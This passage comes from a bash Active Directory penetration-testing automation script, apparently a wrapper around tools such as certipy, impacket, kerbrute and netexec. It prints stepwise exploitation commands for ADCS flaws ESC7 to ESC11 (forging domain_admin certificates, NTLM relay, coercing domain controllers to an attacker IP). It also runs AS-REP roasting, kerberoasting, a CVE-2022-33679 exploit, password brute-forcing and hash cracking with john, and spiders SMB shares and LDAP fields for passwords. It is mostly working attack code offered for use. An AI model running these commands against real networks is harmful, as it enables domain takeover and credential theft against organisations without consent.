            echo -e "${certipy} req ${argument_certipy} -ca $vulntemp -target PKI_Server -template User -upn domain_admin@${dc_domain}"
            echo -e "${CYAN}2. Authenticate using pfx of domain_admin:${NC}"
            echo -e "${certipy} auth -pfx domain_admin.pfx -dc-ip ${dc_ip}"
        done
    fi

    esc7_vuln=$(/usr/bin/jq -r '."Certificate Authorities"[] | select (."[!] Vulnerabilities"."ESC7") | ."CA Name"' "${output_dir}/DomainRecon/ADCS/vuln_${dc_domain}_Certipy.json" 2>/dev/null | sort -u)
    if [[ ! -z $esc7_vuln ]]; then
        echo -e "${GREEN}[+] ESC7 vulnerability potentially found! Follow steps below for exploitation:${NC}"
        for vulntemp in $esc7_vuln; do
            echo -e "${YELLOW}# ${vulntemp} certificate authority${NC}"
            echo -e "${CYAN}1. Add a new officer:${NC}"
            echo -e "${certipy} ca ${argument_certipy} -ca $vulntemp -add-officer "${user}" -dc-ip ${dc_ip}"
            echo -e "${CYAN}2. Enable SubCA certificate template:${NC}"
            echo -e "${certipy} ca ${argument_certipy} --ca $vulntemp -enable-template SubCA -dc-ip ${dc_ip}"
            echo -e "${CYAN}3. Save the private key and note down the request ID:${NC}"
            echo -e "${certipy} req ${argument_certipy} -ca $vulntemp -target PKI_Server -template SubCA -upn domain_admin@${dc_domain} -dc-ip ${dc_ip}"
            echo -e "${CYAN}4. Issue a failed request (need ManageCA and ManageCertificates rights for a failed request):${NC}"
            echo -e "${certipy} ca ${argument_certipy} -ca $vulntemp -issue-request <request_ID> -dc-ip ${dc_ip}"
            echo -e "${CYAN}5. Retrieve an issued certificate:${NC}"
            echo -e "${certipy} req ${argument_certipy} -ca $vulntemp -target PKI_Server -retrieve <request_ID> -dc-ip ${dc_ip}"
            echo -e "${CYAN}6. Authenticate using pfx of domain_admin:${NC}"
            echo -e "${certipy} auth -pfx domain_admin.pfx -dc-ip ${dc_ip}"
        done
    fi

    esc8_vuln=$(/usr/bin/jq -r '."Certificate Authorities"[] | select (."[!] Vulnerabilities"."ESC8") | ."CA Name"' "${output_dir}/DomainRecon/ADCS/vuln_${dc_domain}_Certipy.json" 2>/dev/null | sort -u)
    if [[ ! -z $esc8_vuln ]]; then
        echo -e "${GREEN}[+] ESC8 vulnerability potentially found! Follow steps below for exploitation:${NC}"
        for vulntemp in $esc8_vuln; do
            echo -e "${YELLOW}# ${vulntemp} certificate authority${NC}"
            echo -e "${CYAN}1. Start the relay server:${NC}"
            echo -e "${certipy} relay -ca ${vulntemp} -dc-ip ${dc_ip}"
            echo -e "${CYAN}2. Coerce Domain Controler:${NC}"
            echo -e "${coercer} coerce ${argument_coercer} -t ${i} -l $attacker_IP --dc-ip $dc_ip"
        done
    fi

    esc9_vuln=$(/usr/bin/jq -r '."Certificate Templates"[] | select (."[!] Vulnerabilities"."ESC9" and (."[!] Vulnerabilities"[] | contains("Admins") | not) and ."Enabled" == true)."Template Name"' "${output_dir}/DomainRecon/ADCS/vuln_${dc_domain}_Certipy.json" 2>/dev/null | sort -u)
    if [[ ! -z $esc9_vuln ]]; then
        echo -e "${GREEN}[+] ESC9 vulnerability potentially found! Follow steps below for exploitation:${NC}"
        for vulntemp in $esc9_vuln; do
            echo -e "${YELLOW}# ${vulntemp} certificate template${NC}"
            echo -e "${CYAN}1. Retrieve second_user's NT hash Shadow Credentials (GenericWrite against second_user):${NC}"
            echo -e "${certipy} shadow auto ${argument_certipy} -account <second_user> -dc-ip ${dc_ip}"
            echo -e "${CYAN}2. Change userPrincipalName of second_user to domain_admin:${NC}"
            echo -e "${certipy} account update ${argument_certipy} -user <second_user> -upn domain_admin@${dc_domain} -dc-ip ${dc_ip}"
            echo -e "${CYAN}3. Request vulnerable certificate as second_user:${NC}"
            echo -e "${certipy} req -username <second_user>@${dc_domain} -hash <second_user_hash> -target PKI_Server -ca PKI_CA -template ${vulntemp} -dc-ip ${dc_ip}"
            echo -e "${CYAN}4. Change second_user's UPN back:${NC}"
            echo -e "${certipy} account update ${argument_certipy} -user <second_user> -upn <second_user>@${dc_domain} -dc-ip ${dc_ip}"
            echo -e "${CYAN}5. Authenticate using pfx of domain_admin:${NC}"
            echo -e "${certipy} auth -pfx domain_admin.pfx -dc-ip ${dc_ip}"
        done
    fi

    esc10_vuln=$(/usr/bin/jq -r '."Certificate Authorities"[] | select (."[!] Vulnerabilities"."ESC10") | ."CA Name"' "${output_dir}/DomainRecon/ADCS/vuln_${dc_domain}_Certipy.json" 2>/dev/null | sort -u)
    if [[ ! -z $esc10_vuln ]]; then
        echo -e "${GREEN}[+] ESC10 vulnerability potentially found! Follow steps below for exploitation:${NC}"
        for vulntemp in $esc10_vuln; do
            echo -e "${YELLOW}# ${vulntemp} certificate authority${NC}"
            echo -e "${CYAN}1. Retrieve second_user's NT hash Shadow Credentials (GenericWrite against second_user):${NC}"
            echo -e "${certipy} shadow auto ${argument_certipy} -account <second_user> -dc-ip ${dc_ip}"
            echo -e "${CYAN}2. Change userPrincipalName of user2 to domain_admin or DC:${NC}"
            echo -e "${certipy} account update ${argument_certipy} -user <second_user> -upn domain_admin@${dc_domain} -dc-ip ${dc_ip}"
            echo -e "${certipy} account update ${argument_certipy} -user <second_user> -upn ${dc_NETBIOS}\\\$@${dc_domain} -dc-ip ${dc_ip}"
            echo -e "${CYAN}3. Request certificate permitting client authentication as second_user:${NC}"
            echo -e "${certipy} req -username <second_user>@${dc_domain} -hash <second_user_hash> -ca $vulntemp -template User -dc-ip ${dc_ip}"
            echo -e "${CYAN}4. Change second_user's UPN back:${NC}"
            echo -e "${certipy} account update ${argument_certipy} -user <second_user> -upn <second_user>@${dc_domain} -dc-ip ${dc_ip}"
            echo -e "${CYAN}5. Authenticate using pfx of domain_admin or DC:${NC}"
            echo -e "${certipy} auth -pfx domain_admin.pfx -dc-ip ${dc_ip}"
            echo -e "${certipy} auth -pfx ${dc_NETBIOS}.pfx -dc-ip ${dc_ip}"g
        done
    fi

    esc11_vuln=$(/usr/bin/jq -r '."Certificate Authorities"[] | select (."[!] Vulnerabilities"."ESC11") | ."CA Name"' "${output_dir}/DomainRecon/ADCS/vuln_${dc_domain}_Certipy.json" 2>/dev/null | sort -u)
    if [[ ! -z $esc11_vuln ]]; then
        echo -e "${GREEN}[+] ESC11 vulnerability potentially found! Follow steps below for exploitation:${NC}"
        for vulntemp in $esc11_vuln; do
            echo -e "${YELLOW}# ${vulntemp} certificate authority${NC}"
            echo -e "${CYAN}1. Start the relay server (relay to the Certificate Authority and request certificate via ICPR):${NC}"
            echo -e "ntlmrelayx.py -t rpc://PKI_Server -rpc-mode ICPR -icpr-ca-name $vulntemp -smb2support"
            echo -e "${CYAN}2. Coerce Domain Controler:${NC}"
            echo -e "${coercer} coerce ${argument_coercer} -t ${i} -l $attacker_IP --dc-ip $dc_ip"
        done
    fi
}

silenthound_enum () {
    if [ ! -f "${silenthound}" ]; then
        echo -e "${RED}[-] Please verify the location of silenthound${NC}"
    else
        echo -e "${BLUE}[*] SilentHound Enumeration${NC}"
        if [ -n "$(ls -A ${output_dir}/DomainRecon/SilentHound/ | grep -v 'silenthound_output' 2>/dev/null)" ] ; then
            echo -e "${YELLOW}[i] SilentHound results found, skipping... ${NC}"
        else
            if [ "${kerb_bool}" == true ] || [ "${aeskey_bool}" == true ] ; then
                echo -e "${PURPLE}[-] SilentHound does not support kerberos authentication${NC}"
            else
                current_dir=$(pwd)
                cd ${output_dir}/DomainRecon/SilentHound
                if [ "${ldaps_bool}" == true ]; then ldaps_param="--ssl"; else ldaps_param=""; fi
                run_command "${silenthound} ${argument_silenthd} ${dc_ip} ${dc_domain} -g -n --kerberoast ${ldaps_param} -o ${output_dir}/DomainRecon/SilentHound/${dc_domain}" 2>&1 > ${output_dir}/DomainRecon/SilentHound/silenthound_output_${dc_domain}.txt
                cd ${current_dir}
                /bin/cat ${output_dir}/DomainRecon/SilentHound/${dc_domain}-hosts.txt 2>/dev/null | cut -d " " -f 1 | sort -u | grep "\S" | sed -e "s/$/.${dc_domain}/" > ${output_dir}/DomainRecon/Servers/servers_list_shd_${dc_domain}.txt 2>/dev/null
                /bin/cat ${output_dir}/DomainRecon/SilentHound/${dc_domain}-hosts.txt 2>/dev/null | cut -d " " -f 2 > ${output_dir}/DomainRecon/Servers/ip_list_shd_${dc_domain}.txt 2>/dev/null
                /bin/cp ${output_dir}/DomainRecon/SilentHound/${dc_domain}-users.txt ${output_dir}/DomainRecon/Users/users_list_shd_${dc_domain}.txt 2>/dev/null
                head -n 20 ${output_dir}/DomainRecon/SilentHound/silenthound_output_${dc_domain}.txt 2>/dev/null
                echo -e "............................(truncated output)"
                echo -e "${GREEN}[+] SilentHound enumeration complete.${NC}"
            fi
            parse_users
            parse_servers
        fi
    fi
    echo -e ""
}

ldeep_enum () {
    if [ ! -f "${ldeep}" ]; then
        echo -e "${RED}[-] Please verify the location of ldeep${NC}"
    else
        echo -e "${BLUE}[*] ldeep Enumeration${NC}"
        if [ -n "$(ls -A ${output_dir}/DomainRecon/ldeepDump/ | grep -v 'ldeep_output' 2>/dev/null)" ] ; then
            echo -e "${YELLOW}[i] ldeep results found, skipping... ${NC}"
        else
            if [ "${kerb_bool}" == true ] || [ "${aeskey_bool}" == true ] ; then
                echo -e "${PURPLE}[-] ldeep does not support kerberos authentication${NC}"
            else
                run_command "${ldeep} ldap ${argument_ldeep} -s ldap://${target} all ${output_dir}/DomainRecon/ldeepDump/${dc_domain}" 2>&1 | tee ${output_dir}/DomainRecon/ldeepDump/ldeep_output_${dc_domain}.txt
                /bin/cp ${output_dir}/DomainRecon/ldeepDump/${dc_domain}_users_all.lst ${output_dir}/DomainRecon/Users/users_list_ldp_${dc_domain}.txt 2>/dev/null
                /bin/cp ${output_dir}/DomainRecon/ldeepDump/${dc_domain}_computers.lst ${output_dir}/DomainRecon/Servers/servers_list_ldp_${dc_domain}.txt 2>/dev/null
                parse_users
                parse_servers
            fi
        fi
    fi
    echo -e ""
}

windapsearch_enum () {
    if [ ! -f "${windapsearch}" ]; then
        echo -e "${RED}[-] Please verify the location of windapsearch${NC}"
    else
        echo -e "${BLUE}[*] windapsearch Enumeration${NC}"
        if [ "${kerb_bool}" == true ] || [ "${aeskey_bool}" == true ]; then
            echo -e "${PURPLE}[-] windapsearch does not support kerberos authentication${NC}"
        else
            if [ "${ldaps_bool}" == true ]; then ldaps_param="--secure"; else ldaps_param=""; fi
            run_command "${windapsearch} ${argument_windap} --dc ${dc_ip} ${ldaps_param} -m users --full" > ${output_dir}/DomainRecon/windapsearch_users_${dc_domain}.txt
            run_command "${windapsearch} ${argument_windap} --dc ${dc_ip} ${ldaps_param} -m computers --full" > ${output_dir}/DomainRecon/windapsearch_servers_${dc_domain}.txt
            run_command "${windapsearch} ${argument_windap} --dc ${dc_ip} ${ldaps_param} -m groups --full" > ${output_dir}/DomainRecon/windapsearch_groups_${dc_domain}.txt
            run_command "${windapsearch} ${argument_windap} --dc ${dc_ip} ${ldaps_param} -m privileged-users --full" > ${output_dir}/DomainRecon/windapsearch_privusers_${dc_domain}.txt
            run_command "${windapsearch} ${argument_windap} --dc ${dc_ip} ${ldaps_param} -m custom --filter '(&(objectCategory=computer)(servicePrincipalName=MSSQLSvc*))' --attrs dNSHostName | grep dNSHostName | cut -d ' ' -f 2 | sort -u" > ${output_dir}/DomainRecon/Servers/sql_list_windap_${dc_domain}.txt
            #Parsing user and computer lists
            /bin/cat ${output_dir}/DomainRecon/windapsearch_users_${dc_domain}.txt 2>/dev/null | grep -a "sAMAccountName:" | sed "s/sAMAccountName: //g" | sort -u > ${output_dir}/DomainRecon/Users/users_list_windap_${dc_domain}.txt 2>&1
            /bin/cat ${output_dir}/DomainRecon/windapsearch_servers_${dc_domain}.txt 2>/dev/null | grep -a "dNSHostName:" | sed "s/dNSHostName: //g" | sort -u > ${output_dir}/DomainRecon/Servers/servers_list_windap_${dc_domain}.txt 2>&1
            /bin/cat ${output_dir}/DomainRecon/windapsearch_groups_${dc_domain}.txt 2>/dev/null | grep -a "cn:" | sed "s/cn: //g" | sort -u > ${output_dir}/DomainRecon/groups_list_windap_${dc_domain}.txt 2>&1
            grep -iha "pass\|pwd" ${output_dir}/DomainRecon/windapsearch_*_${dc_domain}.txt 2>/dev/null | grep -av "badPasswordTime\|badPwdCount\|badPasswordTime\|pwdLastSet\|have their passwords replicated\|RODC Password Replication Group\|msExch"  > ${output_dir}/DomainRecon/windapsearch_pwdfields_${dc_domain}.txt
            if [ -s "${output_dir}/DomainRecon/windapsearch_pwdfields_${dc_domain}.txt" ] ; then
                echo -e "${GREEN}[+] Printing passwords found in LDAP fields...${NC}"
                /bin/cat ${output_dir}/DomainRecon/windapsearch_pwdfields_${dc_domain}.txt 2>/dev/null
            fi
            echo -e "${GREEN}[+] windapsearch enumeration of users, servers, groups complete.${NC}"
            parse_users
            parse_servers
        fi
    fi
    echo -e ""
}

###### Kerberos attacks
kerbrute_enum () {
    echo -e "${BLUE}[*] kerbrute User Enumeration (Null session)${NC}"
    if [ "${nullsess_bool}" == true ] ; then
        if [ ! -f "${kerbrute}" ] ; then
            echo -e "${RED}[-] Please verify the location of kerbrute${NC}"
        else
            echo -e "${YELLOW}[i] Using $user_wordlist wordlist for user enumeration. This may take a while...${NC}"
            run_command "${kerbrute} userenum ${user_wordlist} -d ${dc_domain} --dc ${dc_ip} -t 5 ${argument_kerbrute}" 2>&1 > ${output_dir}/Kerberos/kerbrute_user_output_${dc_domain}.txt
            if [ -s "${output_dir}/DomainRecon/Users/users_list_kerbrute_${dc_domain}.txt" ] ; then
                echo -e "${GREEN}[+] Printing valid accounts...${NC}"
                /bin/cat ${output_dir}/DomainRecon/Users/users_list_kerbrute_${dc_domain}.txt 2>/dev/null | grep "VALID" | cut -d " " -f 8 | cut -d "@" -f 1 | tee ${output_dir}/DomainRecon/Users/users_list_kerbrute_${dc_domain}.txt 2>&1
                parse_users
            fi
        fi
    else
        echo -e "${PURPLE}[-] Kerbrute null session enumeration skipped (credentials provided)${NC}"
    fi 
    echo -e ""
}

userpass_kerbrute_check () {
    if [ ! -f "${kerbrute}" ] ; then
        echo -e "${RED}[-] Please verify the location of kerbrute${NC}"
    else
        parse_users
        user_pass_wordlist="${output_dir}/Kerberos/kerbrute_userpass_wordlist_${dc_domain}.txt"
        
        echo -e "${BLUE}[*] kerbrute User=Pass Check (Noisy!)${NC}"
        if [ -s "${users_list}" ] ; then
            echo -e "${YELLOW}[i] Finding users with Password = username using kerbrute. This may take a while...${NC}"
            /bin/rm "${user_pass_wordlist}" 2>/dev/null
            for i in $(/bin/cat ${users_list}); do
                echo -e "${i}:${i}" >> "${user_pass_wordlist}"
            done
            run_command "${kerbrute} bruteforce ${user_pass_wordlist} -d ${dc_domain} --dc ${dc_ip} -t 5 ${argument_kerbrute}" 2>&1 > ${output_dir}/Kerberos/kerbrute_pass_output_${dc_domain}.txt
            /bin/cat ${output_dir}/Kerberos/kerbrute_pass_output_${dc_domain}.txt 2>&1 | grep "VALID" | cut -d " " -f 8 | cut -d "@" -f 1 > "${output_dir}/DomainRecon/user_eq_pass_valid_kerb_${dc_domain}.txt"
            if [ -s "${output_dir}/DomainRecon/user_eq_pass_valid_kerb_${dc_domain}.txt" ] ; then
                echo -e "${GREEN}[+] Printing accounts with username=password...${NC}"
                /bin/cat ${output_dir}/DomainRecon/user_eq_pass_valid_kerb_${dc_domain}.txt 2>/dev/null
            else
                echo -e "${PURPLE}[-] No accounts with username=password found${NC}"
            fi
        else
            echo -e "${PURPLE}[-] No known users found. Run user enumeraton and try again.${NC}"
        fi
    fi
    echo -e ""
}

asrep_attack () {
    if [ ! -f "${impacket_GetNPUsers}" ]; then
        echo -e "${RED}[-] GetNPUsers.py not found! Please verify the installation of impacket${NC}"
    else
        parse_users
        echo -e "${BLUE}[*] AS REP Roasting Attack${NC}"
        if [[ "${dc_domain}" != "${domain}" ]] || [ "${nullsess_bool}" == true ] ; then
            if [ -s "${users_list}" ] ; then
                users_scan_list=${users_list}
            else
                echo -e "${YELLOW}[i] No credentials for target domain provided. Using $user_wordlist wordlist...${NC}"
                users_scan_list=${user_wordlist}
            fi
            run_command "${impacket_GetNPUsers} ${dc_domain} -usersfile ${users_scan_list} -request -dc-ip ${dc_ip} ${argument_ThePorgs}"  > ${output_dir}/Kerberos/asreproast_output_${dc_domain}.txt
            /bin/cat ${output_dir}/Kerberos/asreproast_output_${dc_domain}.txt | grep krb5asrep | sed 's/\$krb5asrep\$23\$//' > ${output_dir}/Kerberos/asreproast_hashes_${dc_domain}.txt 2>&1
        else
            run_command "${impacket_GetNPUsers} ${argument_imp} -dc-ip ${dc_ip} ${argument_ThePorgs}"
            run_command "${impacket_GetNPUsers} ${argument_imp} -request -dc-ip ${dc_ip} ${argument_ThePorgs}" > ${output_dir}/Kerberos/asreproast_output_${dc_domain}.txt
            #${netexec} ${ne_verbose} smb ${servers_smb_list} "${argument_ne}" --asreproast --log ${output_dir}/Kerberos/asreproast_output_${dc_domain}.txt 2>&1
        fi
        if grep -q 'error' ${output_dir}/Kerberos/asreproast_output_${dc_domain}.txt; then
            echo -e "${RED}[-] Errors during AS REP Roasting Attack... ${NC}"
        else
            /bin/cat ${output_dir}/Kerberos/asreproast_output_${dc_domain}.txt | grep krb5asrep | sed 's/\$krb5asrep\$23\$//' | tee ${output_dir}/Kerberos/asreproast_hashes_${dc_domain}.txt 2>&1
            if [ -s "${output_dir}/Kerberos/asreproast_hashes_${dc_domain}.txt" ] ; then
                echo -e "${GREEN}[+] Printing ASREP-roastable accounts...${NC}"
            else
                echo -e "${PURPLE}[-] No ASREP-roastable accounts found${NC}"
            fi
        fi
    fi 
    echo -e ""
}

asreprc4_attack () {
    echo -e "${BLUE}[*] CVE-2022-33679 exploit / AS-REP with RC4 session key (Null session)${NC}"
    if [ ! -f "${CVE202233679}" ] ; then
        echo -e "${RED}[-] Please verify the location of CVE-2022-33679.py${NC}"
    else
        if [ "${nullsess_bool}" == true ] ; then
            if [ ! -f "${output_dir}/Kerberos/asreproast_hashes_${dc_domain}.txt" ]; then
                asrep_attack
            fi
            asrep_user=$(/bin/cat ${output_dir}/Kerberos/asreproast_hashes_${dc_domain}.txt 2>/dev/null| cut -d "@" -f 1 | head -n 1)
            if [ ! "${asrep_user}" == "" ]; then
                current_dir=$(pwd)
                cd ${output_dir}/Credentials
                run_command "python3 ${CVE202233679} ${dc_domain}/${asrep_user} ${dc_domain} -dc-ip ${dc_ip} ${argument_CVE202233679}" 2>&1 | tee ${output_dir}/Kerberos/CVE-2022-33679_output_${dc_domain}.txt
                cd ${current_dir}
            else
                echo -e "${PURPLE}[-] No ASREProastable users found to perform Blind Kerberoast. If ASREProastable users exist, re-run ASREPRoast attack and try again.${NC}"
            fi
        else
            echo -e "${PURPLE}[-] CVE-2022-33679 skipped (credentials provided)${NC}"
        fi
    fi
    echo -e ""
}

kerberoast_attack () {
    if [ ! -f "${impacket_GetUserSPNs}" ]; then
        echo -e "${RED}[-] GetUserSPNs.py not found! Please verify the installation of impacket${NC}"
    else
        if [[ "${dc_domain}" != "${domain}" ]] || [ "${nullsess_bool}" == true ] ; then
            parse_users
            echo -e "${BLUE}[*] Blind Kerberoasting Attack${NC}"
            asrep_user=$(/bin/cat ${output_dir}/Kerberos/asreproast_hashes_${dc_domain}.txt 2>/dev/null| cut -d "@" -f 1 | head -n 1)
            if [ ! "${asrep_user}" == "" ]; then
                run_command "${impacket_GetUserSPNs} -no-preauth ${asrep_user} -usersfile ${users_list} -dc-ip ${dc_ip} ${argument_ThePorgs} ${dc_domain}" 2>&1 > ${output_dir}/Kerberos/kerberoast_blind_output_${dc_domain}.txt
                if grep -q 'error' ${output_dir}/Kerberos/kerberoast_blind_output_${dc_domain}.txt; then
                    echo -e "${RED}[-] Errors during Blind Kerberoast Attack... ${NC}"
                else
                    /bin/cat ${output_dir}/Kerberos/kerberoast_blind_output_${dc_domain}.txt | grep krb5tgs | sed 's/\$krb5tgs\$/:\$krb5tgs\$/' | awk -F "\$" -v OFS="\$" '{print($6,$1,$2,$3,$4,$5,$6,$7,$8)}' | sed 's/\*\$:/:/' | tee ${output_dir}/Kerberos/kerberoast_hashes_${dc_domain}.txt
                fi
            else
                echo -e "${PURPLE}[-] No ASREProastable users found to perform Blind Kerberoast. Run ASREPRoast attack and try again.${NC}"
            fi
        else
            echo -e "${BLUE}[*] Kerberoast Attack${NC}"
            run_command "${impacket_GetUserSPNs} ${argument_imp} -dc-ip ${dc_ip} ${argument_ThePorgs} -target-domain ${dc_domain}" | tee ${output_dir}/Kerberos/kerberoast_list_output_${dc_domain}.txt
            run_command "${impacket_GetUserSPNs} ${argument_imp} -request -dc-ip ${dc_ip} ${argument_ThePorgs} -target-domain ${dc_domain}" > ${output_dir}/Kerberos/kerberoast_output_${dc_domain}.txt
            #${netexec} ${ne_verbose} smb ${servers_smb_list} "${argument_ne}" --kerberoasting --log ${output_dir}/Kerberos/kerberoast_output_${dc_domain}.txt 2>&1
            if grep -q 'error' ${output_dir}/Kerberos/kerberoast_output_${dc_domain}.txt; then
                    echo -e "${RED}[-] Errors during Kerberoast Attack... ${NC}"
                else
                    /bin/cat ${output_dir}/Kerberos/kerberoast_output_${dc_domain}.txt | grep krb5tgs | sed 's/\$krb5tgs\$/:\$krb5tgs\$/' | awk -F "\$" -v OFS="\$" '{print($6,$1,$2,$3,$4,$5,$6,$7,$8)}' | sed 's/\*\$:/:/' > ${output_dir}/Kerberos/kerberoast_hashes_${dc_domain}.txt
                    /bin/cat ${output_dir}/Kerberos/kerberoast_list_output_${dc_domain}.txt | grep MSSQLSvc | cut -d '/' -f 2 | cut -d ':' -f 1 | cut -d ' ' -f 1 | sort -u > ${output_dir}/DomainRecon/Servers/sql_list_kerberoast_${dc_domain}.txt
            fi
        fi
    fi 
    echo -e ""
}

targetedkerberoast_attack () {
    echo -e "${BLUE}[*] Targeted Kerberoasting Attack (Noisy!)${NC}"
    if [ ! -f "${targetedKerberoast}" ] ; then
        echo -e "${RED}[-] Please verify the location of targetedKerberoast.py${NC}"
    else
        if [ "${nullsess_bool}" == true ] ; then
            echo -e "${PURPLE}[-] targetedKerberoast requires credentials${NC}"
        else
            if [ "${ldaps_bool}" == true ]; then ldaps_param="--use-ldaps"; else ldaps_param=""; fi
            run_command "${targetedKerberoast} ${argument_targkerb} -D ${dc_domain} --dc-ip ${dc_ip} ${ldaps_param} --only-abuse --dc-host ${dc_NETBIOS} -o ${output_dir}/Kerberos/targetedkerberoast_hashes_${dc_domain}.txt" 2>&1 | tee ${output_dir}/Kerberos/targetedkerberoast_output_${dc_domain}.txt
        fi
    fi
    echo -e ""
}

john_crack_asrep(){
    if [ ! -f "${john}" ] ; then
        echo -e "${RED}[-] Please verify the installation of john${NC}"
    else
        echo -e "${BLUE}[*] Cracking found hashes using john the ripper${NC}"
        if [ ! -s ${output_dir}/Kerberos/asreproast_hashes_${dc_domain}.txt ]; then
            echo -e "${PURPLE}[-] No accounts with Kerberos preauth disabled found${NC}"
        else
            echo -e "${YELLOW}[i] Using $pass_wordlist wordlist...${NC}"
            echo -e "${CYAN}[*] Launching john on collected asreproast hashes. This may take a while...${NC}"
            echo -e "${YELLOW}[i] Press CTRL-C to abort john...${NC}"
            run_command "$john ${output_dir}/Kerberos/asreproast_hashes_${dc_domain}.txt --format=krb5asrep --wordlist=$pass_wordlist"
            echo -e "${GREEN}[+] Printing cracked AS REP Roast hashes...${NC}"
            run_command "$john ${output_dir}/Kerberos/asreproast_hashes_${dc_domain}.txt --format=krb5asrep --show" | tee ${output_dir}/Kerberos/asreproast_john_results_${dc_domain}.txt
        fi
    fi
    echo -e ""
}

john_crack_kerberoast(){
    if [ ! -f "${john}" ] ; then
        echo -e "${RED}[-] Please verify the installation of john${NC}"
    else
        echo -e "${BLUE}[*] Cracking found hashes using john the ripper${NC}"
        if [ ! -s ${output_dir}/Kerberos/kerberoast_hashes_${dc_domain}.txt ] && [ ! -s ${output_dir}/Kerberos/targetedkerberoast_hashes_${dc_domain}.txt ]; then
            echo -e "${PURPLE}[-] No SPN accounts found${NC}"
        else
            echo -e "${YELLOW}[i] Using $pass_wordlist wordlist...${NC}"
            echo -e "${CYAN}[*] Launching john on collected kerberoast hashes. This may take a while...${NC}"
            echo -e "${YELLOW}[i] Press CTRL-C to abort john...${NC}"
            run_command "$john ${output_dir}/Kerberos/*kerberoast_hashes_${dc_domain}.txt --format=krb5tgs --wordlist=$pass_wordlist"
            echo -e "${GREEN}[+] Printing cracked Kerberoast hashes...${NC}"
            run_command "$john ${output_dir}/Kerberos/*kerberoast_hashes_${dc_domain}.txt --format=krb5tgs --show" | tee ${output_dir}/Kerberos/kerberoast_john_results_${dc_domain}.txt
        fi
    fi
    echo -e ""
}

###### Shares scan
smb_map () {
    if [ ! -f "${smbmap}" ]; then
        echo -e "${RED}[-] Please verify the installation of smbmap${NC}"
    else
        echo -e "${BLUE}[*] SMB shares Scan using smbmap${NC}"
        if [ "${kerb_bool}" == true ] || [ "${aeskey_bool}" == true ]; then
            echo -e "${PURPLE}[-] smbmap does not support kerberos authentication${NC}"
        else
            smb_scan
            echo -e "${BLUE}[*] Listing accessible SMB shares - Step 1/2${NC}"
            for i in $(/bin/cat ${servers_smb_list} | grep -v ":"); do
                echo -e "${CYAN}[*] Listing shares on ${i} ${NC}"
                run_command "${smbmap} -H $i ${argument_smbmap}" | grep -v "Working on it..." 2>&1 > ${output_dir}/Shares/smbmapDump/smb_shares_${dc_domain}_${i}.txt 
            done

            grep -iaH READ ${output_dir}/Shares/smbmapDump/smb_shares_${dc_domain}_*.txt 2>&1 | grep -v 'prnproc\$\|IPC\$\|print\$\|SYSVOL\|NETLOGON' | sed "s/\t/ /g; s/   */ /g; s/READ ONLY/READ-ONLY/g; s/READ, WRITE/READ-WRITE/g; s/smb_shares_//; s/.txt://g; s/${dc_domain}_//g" | rev | cut -d "/" -f 1 | rev | awk -F " " '{print $1 ";"  $2 ";" $3}' > ${output_dir}/Shares/all_network_shares_${dc_domain}.csv
            grep -iaH READ ${output_dir}/Shares/smbmapDump/smb_shares_${dc_domain}_*.txt 2>&1 | grep -v 'prnproc\$\|IPC\$\|print\$\|SYSVOL\|NETLOGON' | sed "s/\t/ /g; s/   */ /g; s/READ ONLY/READ-ONLY/g; s/READ, WRITE/READ-WRITE/g; s/smb_shares_//; s/.txt://g; s/${dc_domain}_//g" | rev | cut -d "/" -f 1 | rev | awk -F " " '{print "\\\\" $1 "\\" $2}' > ${output_dir}/Shares/all_network_shares_${dc_domain}.txt

            echo -e "${BLUE}[*] Listing files in accessible shares - Step 2/2${NC}"
            for i in $(/bin/cat ${servers_smb_list} | grep -v ":"); do
                echo -e "${CYAN}[*] Listing files in accessible shares on ${i} ${NC}"
                if [ "${kerb_bool}" == true ] ; then
                    echo -e "${PURPLE}[-] smbmap does not support kerberos tickets${NC}"
                else
                    current_dir=$(pwd)
                    mkdir -p ${output_dir}/Shares/smbmapDump/${i}
                    cd ${output_dir}/Shares/smbmapDump/${i}
                    run_command "${smbmap} -H $i ${argument_smbmap} -A '\.cspkg|\.publishsettings|\.xml|\.json|\.ini|\.bat|\.log|\.pl|\.py|\.ps1|\.txt|\.config|\.conf|\.cnf|\.sql|\.yml|\.cmd|\.vbs|\.php|\.cs|\.inf' -r --exclude 'ADMIN$' 'C$' 'C' 'IPC$' 'print$' 'SYSVOL' 'NETLOGON' 'prnproc$'" | grep -v "Working on it..." 2>&1 > ${output_dir}/Shares/smbmapDump/smb_files_${dc_domain}_${i}.txt 
                    cd ${current_dir}
                fi
            done
        fi
    fi
    echo -e ""
}

ne_shares () {
    echo -e "${BLUE}[*] Enumerating Shares using netexec ${NC}"
    if [ "${kerb_bool}" == true ]; then
        echo -e "${PURPLE}[-] Targeting DCs only${NC}"
        curr_targets="Domain Controllers"
    fi
    smb_scan
    run_command "${netexec} ${ne_verbose} smb ${servers_smb_list} ${argument_ne} --shares --log ${output_dir}/Shares/ne_shares_output_${dc_domain}.txt" 2>&1
    echo -e ""
}

ne_spider () {
    echo -e "${BLUE}[*] Spidering Shares using netexec ${NC}"
    if [ "${kerb_bool}" == true ]; then
        echo -e "${PURPLE}[-] Targeting DCs only${NC}"
        curr_targets="Domain Controllers"
    fi
    smb_scan
    run_command "${netexec} ${ne_verbose} smb ${servers_smb_list} ${argument_ne} -M spider_plus -o OUTPUT=${output_dir}/Shares/ne_spider_plus EXCLUDE_DIR=prnproc$,IPC$,print$,SYSVOL,NETLOGON --log ${output_dir}/Shares/ne_spider_output${dc_domain}.txt" 2>&1
    echo -e ""
}

finduncshar_scan () {
    if [ ! -f "${FindUncommonShares}" ]; then
        echo -e "${RED}[-] Please verify the installation of FindUncommonShares${NC}"
    else
        echo -e "${BLUE}[*] Enumerating Shares using FindUncommonShares${NC}"
        if [ "${hash_bool}" == true ] || [ "${kerb_bool}" == true ] || [ "${aeskey_bool}" == true ]; then
            echo -e "${PURPLE}[-] FindUncommonShares does not support PtH nor kerberos authentication${NC}"
        else
            if [ "${ldaps_bool}" == true ]; then ldaps_param="--use-ldaps"; else ldaps_param=""; fi
            run_command "${FindUncommonShares} ${argument_finduncshar} ${ldaps_param} --dc-ip ${dc_ip} --check-user-access --export-xlsx ${output_dir}/Shares/finduncshar_${dc_domain}.xlsx" 2>&1 | tee -a ${output_dir}/Shares/finduncshar_shares_output_${dc_domain}.txt
        fi
    fi
    echo -e ""
}

manspider_scan () {
    echo -e "${BLUE}[*] Spidering Shares using manspider ${NC}"
    if [ "${kerb_bool}" == true ] || [ "${aeskey_bool}" == true ] ; then
        echo -e "${PURPLE}[-] manspider does not support kerberos authentication${NC}"
    else
        smb_scan
        echo -e "${CYAN}[*] Searching for files with interesting filenames${NC}"
